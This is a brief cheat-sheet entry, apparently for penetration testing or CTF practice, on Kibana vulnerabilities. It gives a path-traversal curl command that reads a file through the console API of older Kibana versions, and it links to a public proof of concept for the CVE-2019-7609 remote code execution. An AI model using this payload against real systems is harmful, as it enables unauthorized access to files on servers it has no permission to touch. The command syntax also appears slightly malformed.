---
title: Kibana
desc: A proprietary data visualization dashboard software for Elasticsearch.
tags: [Elasticsearch]
alts: [ElasticsearchExploit]
website:
render_with_liquid: false
---

## Local File Inclusion on version < 6.4.3 & 5.6.13

```sh
curl -X http://10.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt
```

<br />

## Remote Code Execution on version < 6.6.0

Reference: <a href="https://github.com/mpgn/CVE-2019-7609">https://github.com/mpgn/CVE-2019-7609</a>